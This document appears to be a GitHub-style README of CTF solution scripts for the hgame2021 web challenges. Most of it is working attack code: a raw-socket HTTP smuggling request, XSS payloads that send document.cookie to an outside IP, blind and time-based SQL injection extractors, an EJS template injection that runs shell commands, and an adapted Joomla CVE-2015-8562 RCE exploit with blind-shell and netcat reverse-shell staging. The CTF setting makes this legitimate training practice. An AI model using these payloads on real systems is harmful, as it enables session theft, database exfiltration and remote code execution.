# hgame2021

- scripts/solutions in hgame2021

## week1

### Hitchhiking_in_the_Galaxy

HTTP header tricks

### watermelon

find `alert(xxx)` in js 

### 智商检测鸡

* calc script
```python
s = requests.session()

for i in range(1,101):
    r = s.get('http://r4u.top:5000/api/getQuestion')
    quals = r.json()['question']
    print(quals)
    limit_1 = int(re.sub(r'\<(.*?)\>', '', re.findall(r'<mrow>(.*?)</mrow>', quals)[0].lstrip('<msubsup><mo>∫</mo><mrow>')))
    limit_2 = int(re.sub(r'\<(.*?)\>', '', re.findall(r'<mrow>(.*?)</mrow>', quals)[1]))
    ans = re.findall(r'\((.*)\)', re.sub('<(.*?)>', '', r.json()['question']).lstrip('∫'))[0].split('x+')
    a = int(ans[0])
    b = int(ans[1])

    x = sympy.Symbol('x')
    f = a * x + b
    result = sympy.integrate(f, (x, limit_1, limit_2))
    print((result))
    r = s.post('http://r4u.top:5000/api/verify', json={'answer': eval(str(result))})
    print(r.json())
    r = s.get('http://r4u.top:5000/api/getStatus')
    print(r.json())

r = s.get('http://r4u.top:5000/api/getFlag')
print(r.json())
```
### 宝藏走私者 && 走私者的愤怒

* http smuggle by socket

```python
import socket


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("police.liki.link", 80))
s.send(b'GET /secret HTTP/1.1\r\nHost: police.liki.link\r\nContent-Length : 68\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /secret HTTP/1.1\r\nHost: 127.0.0.1\r\nClient-IP: 127.0.0.1\r\n\r\n')
r = s.recv(4096)
print(r.decode())
```

## week2

### Post to zuckonit

* svg/onload={HTML-ENTITIES}
* reverse the order due to the silly waf
```
>";b3x#&;56x#&;96x#&;b6x#&;f6x#&;f6x#&;36x#&;e2x#&;47x#&;e6x#&;56x#&;d6x#&;57x#&;36x#&;f6x#&;46x#&;b2x#&;22x#&;d3x#&;37x#&;f3x#&;f2x#&;03x#&;03x#&;03x#&;83x#&;a3x#&;23x#&;03x#&;23x#&;e2x#&;63x#&;43x#&;23x#&;e2x#&;73x#&;23x#&;e2x#&;03x#&;23x#&;13x#&;f2x#&;f2x#&;a3x#&;07x#&;47x#&;47x#&;86x#&;22x#&;d3x#&;66x#&;56x#&;27x#&;86x#&;e2x#&;e6x#&;f6x#&;96x#&;47x#&;16x#&;36x#&;f6x#&;c6x#&;e2x#&;77x#&;f6x#&;46x#&;e6x#&;96x#&;77x#&"=daolon/gvgvss<
"window.location.href="ip:7788/?s="+document.cookie;"
```
### LazyDogR4U

* extract override your session 
```python
cookies = {'PHPSESSID':'4a4dbd3ee7e8aedbefec37b4fb9d1742'}
url = 'http://44a2feda3b.lazy.r4u.top/'
r = requests.post(url+'lazy.php', cookies=cookies,data={'_SESSESSIONSION[username]':'admin'})
r = requests.get(url+'flag.php', cookies=cookies)
```

### 200OK!!

* double the payload to bypass the waf
```python
def solve():
    url = 'https://200ok.liki.link/server.php'
    res = ''
    for j in range(1, 50):
        print(j)
        for i in string.printable:
            headers = {
                'Status': ("0' and ascii(substr((seselectlect group_concat(ffffff14gggggg) frfromom f1111111144444444444g),"+str(j)+",1))="+str(ord(i))+" and '1'='1").replace(' ', '/**/')
            }
            r = requests.get(url, headers=headers)
            if '200 OK' in r.text:
                res += i
                print(res)
                break
```
### Liki的生日礼物

race condition

## week3

### Forgetful

ssti

### Post to zuckonit2.0/ Post to zuckonit another version

* only iframe is allowed with CSP protected
* arbitary js to get xss in /preview (unfixed)
* replace the src to `javascript:{PAYLOAD}` to get xss in /peview (fixed)

payload of first version:
```python
payload = "javascript:{window.location.href='http://120.27.246.202:8000/?s='+document.cookie}"
poc = '"+{valueOf: new \'\'.constructor.constructor(atob("%s"))}//'
#print(poc % b64encode(payload.encode()).decode())
```
payload of another version
```
#/preview javascript:{window.location.href=%27http://120.27.246.202:8000/?s=%27+document.cookie}
```

For another another version:

* replace function to search -> 
```data[i].replace(new RegExp(content, 'g'), `<b class="search_result">${content}</b>`)```, so we need to control the content via regex.
* Turns out that you can simply use `|` to match either pattern. So we can control the content
```
pre|123' onload='eval(xxx)' id='
```
then the content becomes `<iframe src='/<b class="search_result">pre|123' onload='alert(1)' id='</b>view` and we got xss.

### Liki-Jail

* sql-i with two params while `'` is forbidden, so only `\` is possible to bypass
* like for `=` 
```python
url = 'https://jailbreak.liki.link/login.php'


def fuzz1():
    res = ''
    for j in range(1, 100):
        print(j)
        for i in string.printable:  # u5ers
            payload = 'or if(ascii(substr((select/**/`p@ssword`/**/from/**/u5ers),'+str(j)+',1)) like ' + str(ord(i)) + ',sleep(3),1)#'
            payload = payload.replace(' ', '/**/')
            data = {
                'username': 'admin\\',
                'password': payload
            }
            t = time.time()
            r = requests.post(url, data=data)
            if 'Invalid' in r.text:
                print('NO')
                break
            if time.time() - t > 3:
                res += i
                print(res)
                break
```
### Arknights

unserialization


## week4

### Unforgettable

* easy to find the double injection after signing in. Seems a blind-based one
* At first I find bool-based injection feasible since the results of username differ. But soon I find it hard to judge the result when injecting flag
* After changing payload to time-based (benchmark). All seems fine then :)

```python
# coding: utf-8
# -**- author: byc_404 -**-
import requests
import random
import time
import string
import re


def generate_random_str(randomlength=16):
    str_list = [random.choice(string.digits + string.ascii_letters) for i in range(randomlength)]
    random_str = ''.join(str_list)
    return str(random_str)


url = 'https://unforgettable.liki.link/'

s = requests.session()


def fuzz(i):
    email = generate_random_str(25) + '@' + '123.com'
    username = generate_random_str(30) + "aml'^(if(1,,0))^'1",
    data = {
        'username': username,
        'email': email,
        'password': '123',
    }
    s.post(url + 'register', data=data, allow_redirects=False)
    s.post(url + 'login', data={
        'email': email,
        'password': '123',
    })
    r = s.get(url + 'user')
    print(r.text)
    return r.text


def solve(i):
    email = generate_random_str(25) + '@' + str(generate_random_str(5)) + '.com'
    username = generate_random_str(30) + "gml'^(if(((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/regexp/**/'^ffflllaagggg')/**/regexp/**/'^%s'),1,0))^'1" % (str(i)),
    data = {
        'username': username,
        'email': email,
        'password': '123',
    }
    s.post(url + 'register', data=data, allow_redirects=False)
    s.post(url + 'login', data={
        'email': email,
        'password': '123',
    })
    r = s.get(url + 'user')
    return r.text


# 'Username: /**/'
# table:ffflllaagggg
# column: fflllLaaaAgg
#         ffllllaaaaG

def flag(i):
    email = generate_random_str(25) + '@' + str(generate_random_str(5)) + '.com'
    username = generate_random_str(30) + "aml'^(if(((select/**/group_concat(ffllllaaaagg)/**/from/**/ffflllaagggg)/**/regexp/**/'^%s'),benchmark(10000000,sha('1')),0))^'1" % (str(i)),
    data = {
        'username': username,
        'email': email,
        'password': '123',
    }
    s.post(url + 'register', data=data, allow_redirects=False)
    s.post(url + 'login', data={
        'email': email,
        'password': '123',
    })
    r = s.get(url + 'user')
    return r.text


res = '0rm_i5_th3_s0lu'

for i in range(1, 50):
    print(i)
    for j in (string.digits + string.ascii_lowercase + '_'):
        t = time.time()
        r = flag(re.escape(res + j))
        if time.time() - t > 2:
            res += j
            print(res)
            break

```

### 漫无止境的星期日

* ez prototype trick with ejs
```python
url = 'http://macguffin.0727.site:5000/'

s = requests.session()

s.post(url, json={"__proto__": {"crying": True}, "name": "byc", "discription": "byc"})
s.post(url + 'wish', json={"wishes": "<%- global.process.mainModule.require('child_process').execSync('cat /flag') %>"})
r = s.get(url + 'show')
print(r.text)
```

### joomlaJoomla!!!!!

* joomla 3.4.5 RCE. Diff the source with official version then you'll find that the author modify some of the source code. Just simply bypass it.

script from [https://www.exploit-db.com/exploits/39033](https://www.exploit-db.com/exploits/39033)
Modify a little bit of it will do the job. (`|` => `||`)
```python
import requests
import subprocess
import argparse
import sys
import base64
 
# Heavy lifting from PoC author Gary@ Sec-1 ltd (http://www.sec-1.com)
def get_url(url, user_agent):
 
    headers = {
    'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3', # Change default UA for Requests
    'x-forwarded-for': user_agent   # X-Forwarded-For header instead of UA
    }
    cookies = requests.get(url,headers=headers).cookies
    for _ in range(3):
        response = requests.get(url, headers=headers,cookies=cookies)    
    return response.content


def php_str_noquotes(data):
    "Convert string to chr(xx).chr(xx) for use in php"
    encoded = ""
    for char in data:
        encoded += "chr({0}).".format(ord(char))
 
    return encoded[:-1]

 
def generate_payload(php_payload):
 
    php_payload = "eval({0})".format(php_str_noquotes(php_payload))
 
    terminate = '\xf0\xfd\xfd\xfd';
    exploit_template = r'''}__test||O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";'''
    injected_payload = "{};JFactory::getConfig();exit".format(php_payload)    
    exploit_template += r'''s:{0}:"{1}"'''.format(str(len(injected_payload)), injected_payload)
    exploit_template += r''';s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}''' + terminate
 
    return exploit_template


def main():
    parser = argparse.ArgumentParser(prog='cve-2015-8562.py', description='Automate blind RCE for Joomla vuln CVE-2015-8652')
    parser.add_argument('-t', dest='RHOST', required=True, help='Remote Target Joomla Server')
    parser.add_argument('-l', dest='LHOST', help='specifiy local ip for reverse shell')
    parser.add_argument('-p', dest='LPORT', help='specifiy local port for reverse shell')
    parser.add_argument('--cmd', dest='cmd', action='store_true', help='drop into blind RCE')

    args = parser.parse_args()

    if args.cmd:
        print "[-] Attempting to exploit Joomla RCE (CVE-2015-8562) on: {}".format(args.RHOST)
        print "[-] Dropping into shell-like environment to perform blind RCE"
        while True:
            command = raw_input('$ ')
            cmd_str = "system('{}');".format(command)
            pl = generate_payload(cmd_str)
            print get_url(args.RHOST, pl)

    # Spawn Reverse Shell using Netcat listener + Python shell on victim
    elif args.LPORT and args.LPORT:
        connection = "'{}', {}".format(args.LHOST, args.LPORT)

        # pentestmonkey's Python reverse shell one-liner:
        # Stage 1 payload Str
        #payload = "echo {} | base64 -d > /tmp/newhnewh.py".format(encoded_comm)
        payload = "cat /flag"
        print "[-] Attempting to exploit Joomla RCE (CVE-2015-8562) on: {}".format(args.RHOST)
        print "[-] Uploading python reverse shell with LHOST {} and {}".format(args.LHOST, args.LPORT)
        # Stage 1: Uploads the Python reverse shell to "/tmp/newhnewh.py"
        pl = generate_payload("system('"+payload+"');")
        print get_url(args.RHOST, pl)
        # Spawns Shell listener using netcat on LHOST
        listener = subprocess.Popen(args=["gnome-terminal", "--command=nc -lvp "+args.LPORT])
        print "[+] Spawning reverse shell...."
        # Stage 2: Executes Python reverse shell back to LHOST:LPORT
        pl = generate_payload("system('python /tmp/newhnewh.py');")
        print get_url(args.RHOST, pl)
    else:
        print '[!] missing arguments'
        parser.print_help()


if __name__ == "__main__":
    main()
```